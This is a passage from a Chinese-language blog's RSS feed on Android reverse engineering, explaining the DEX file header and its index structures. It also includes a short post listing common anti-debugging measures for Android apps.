headerSize;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#              endianTag;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#              linkSize;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#              linkOff;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#              mapOff;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#              stringIdsSize;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#              stringIdsOff;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#              typeIdsSize;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#              typeIdsOff;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#              protoIdsSize;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#              protoIdsOff;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#              fieldIdsSize;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#              fieldIdsOff;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#              methodIdsSize;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#              methodIdsOff;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#              classDefsSize;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#              classDefsOff;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#              dataSize;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#              dataOff;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
1.checksum：dex 文件校验和。&lt;br /&gt;
2. signature [kSHA1DigestLen]：整个 dex 文件通过 SHA-1 签名得到的值，占用 20 字节，用于检验 dex 文件。&lt;br /&gt;
3.endianTag: 字节序标记，用于指定 dex 运行环境的 cpu。&lt;br /&gt;
4.linkSzie 和 linkOff：指定链接段大小和文件偏移，通常情况下都为 0.linkSize 为 0 的话表示静态链接。&lt;br /&gt;
5.mapOff：指定 DexMapList 的文件偏移。&lt;br /&gt;
6.stringIdsSize 和 stringIdsOff：指定了 dex 文件中所有用到的字符串的个数和 string_ids 结构位置偏移。&lt;br /&gt;
7.typeIdsSize 和 TypeIdsOff：表示类的类型的数量和 type_ids 结构位置偏移。&lt;br /&gt;
8.protoIdsSize 和 protoIdsOff：表示 dex 文件中方法原型的个数和 proto_ids 结构位置偏移。&lt;br /&gt;
9.fieldIdsSize 和 fieldsIdsOff：表示 dex 文件中字段个数和 field_ids 结构位置偏移。&lt;br /&gt;
10.methodIdsSize 和 methodIdsOff：表示 dex 文件中的方法数量和 methods_ids 结构位置偏移。&lt;br /&gt;
11.classDefsSize 和 classDefsOff：指明 dex 文件中类的定义的相关信息。&lt;/p&gt;
&lt;h1 id=&#34;string_ids&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#string_ids&#34;&gt;#&lt;/a&gt; string_ids&lt;/h1&gt;
&lt;p&gt;string_ids 结构中，每 4 字节表示一个位置偏移，该偏移指向真正字符串的偏移地址，真正的字符串存在 data 中。&lt;/p&gt;
&lt;h1 id=&#34;type_ids&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#type_ids&#34;&gt;#&lt;/a&gt; type_ids&lt;/h1&gt;
&lt;p&gt;types_ids 中只存在一种数据 descriptorIdx，它的值为 string_ids 结构的索引。&lt;/p&gt;
&lt;h1 id=&#34;proto_ids&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#proto_ids&#34;&gt;#&lt;/a&gt; proto_ids&lt;/h1&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#     struct proto_ids&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#              shortyIdx;   // 指向 string_Ids 列表的索引 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#              returnTypeIdx;  // 指向 type_Id 列表的索引 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#              parametersOff;  // 指向 type_list 的位置偏移 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#              &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;type_list&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#type_list&#34;&gt;#&lt;/a&gt; type_list&lt;/h2&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#     struct type_list&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#             size; //type_Item 的个数 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#             type_item  list [1];  //type_Item 结构，只有一个 type_id 参数，指向 type_id 列表 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#             &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h1 id=&#34;field_ids&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#field_ids&#34;&gt;#&lt;/a&gt; field_ids&lt;/h1&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#        struct field_ids&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#             classIdx;  // 类的类型，指向 type_Id 列表的索引 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#             typeIdx;  // 字段类型，指向 type_Id 列表的索引 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#             nameIdx;  // 字段名，指向 string_Id 列表的索引 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#             &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h1 id=&#34;methods_ids&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#methods_ids&#34;&gt;#&lt;/a&gt; methods_ids&lt;/h1&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#      struct method_id&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#             classIdx;   // 类的类型，指向 type_Id 列表的索引 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#             protoIdx;  // 声明类型，指向 proto_Id 列表的索引 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#             nameIdx;  // 方法名，指向 string_Id 列表的索引 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#             &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h1 id=&#34;class_defs&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#class_defs&#34;&gt;#&lt;/a&gt; class_defs&lt;/h1&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#           struct    class_defs&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#                   classIdx;  // 类的类型，指向 type_Id 列表的索引 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#                   accessFlags;  // 访问标志 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#                   superclassIdx;  // 父类类型，指向 type_Id 列表的索引 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#                   interfacesOff;  // 接口，指向 type_list 的偏移 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#                   sourceFileIdx;  // 源文件名，指向 string_Ids 列表的索引 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#                   annotationsOff;  // 注解，指向 annotationsDirectory_Item 结构 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#                   classDataOff;  // 指向 class_data 结构的偏移 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#                   staticValuesOff;  // 指向 encoded_array 结构的偏移 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#                   &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;class_data&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#class_data&#34;&gt;#&lt;/a&gt; class_data&lt;/h2&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#        struct DexClassData&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#              classDataHeader	header;	     // 指定字段与方法的个数 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#              Field* 		staticFields;   // 静态字段，Field 结构 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#              Field*		instanceFields;  // 实例字段，Field 结构 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#              Method*		directMethods;  // 直接方法，Method 结构 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#              Method*		virtualMethods;  // 虚方法，Method 结构 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#              &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;classdataheader&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#classdataheader&#34;&gt;#&lt;/a&gt; classDataHeader&lt;/h2&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#   struct classDataHeader&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#               staticFieldsSize;  // 静态字段个数 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#               instanceFieldsSize;  // 实例字段个数 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#               directMethodsSize;  // 直接方法个数 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#               virtualMethodsSize;  // 虚方法个数 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#               &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;field&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#field&#34;&gt;#&lt;/a&gt; Field&lt;/h2&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#       struct DexField&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#            field_Idx;  // 指向 field_Ids 的索引 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#            accessFlags;  // 访问标志 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;method&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#method&#34;&gt;#&lt;/a&gt; Method&lt;/h2&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#           struct DexMethod&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#                   method_Idx;  // 指向 method_Ids 的索引 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#                   accessFlags;  // 访问标志 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#                   codeOff;  // 指向 code 结构的偏移 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#                   &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://ericcd.com/2022/03/04/Android-reverce-2022.3.4-1/</guid>
            <title>Android 逆向 - 2022.3.4-1</title>
            <link>http://ericcd.com/2022/03/04/Android-reverce-2022.3.4-1/</link>
            <category term="Android逆向知识" scheme="http://ericcd.com/categories/Android%E9%80%86%E5%90%91%E7%9F%A5%E8%AF%86/" />
            <category term="Android逆向" scheme="http://ericcd.com/tags/Android%E9%80%86%E5%90%91/" />
            <pubDate>Fri, 04 Mar 2022 09:34:29 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;记录一些常见的反调试策略。&lt;br /&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;br /&gt;
1.java 代码混淆。&lt;br /&gt;
2. 资源文件混淆：可以使用 MT 管理器来单独修改 apk 中的 dex 文件。&lt;br /&gt;
3. 签名验证。&lt;br /&gt;
4. 模拟器检测。&lt;br /&gt;
5. 关键文件检测。&lt;br /&gt;
6. 调试端口检测。&lt;br /&gt;
7. 进程名称检测。&lt;/p&gt;
 ]]></description>
        </item>
    </channel>
</rss>
